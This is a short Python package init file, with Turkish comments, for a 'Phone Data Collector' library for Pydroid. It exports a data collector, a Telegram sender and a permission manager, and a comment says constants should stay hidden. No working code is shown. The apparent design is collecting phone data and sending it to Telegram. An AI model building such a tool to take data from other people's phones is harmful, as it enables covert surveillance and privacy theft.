"""
Phone Data Collector - Pydroid için telefon verisi toplama kütüphanesi
"""

from .collector import DataCollector
from .telegram_sender import TelegramSender
from .permissions import PermissionManager

# Sabit bilgileri dışa aktarma (gizli kalmalı)
__version__ = "0.1.0"
__all__ = ['DataCollector', 'TelegramSender', 'PermissionManager']
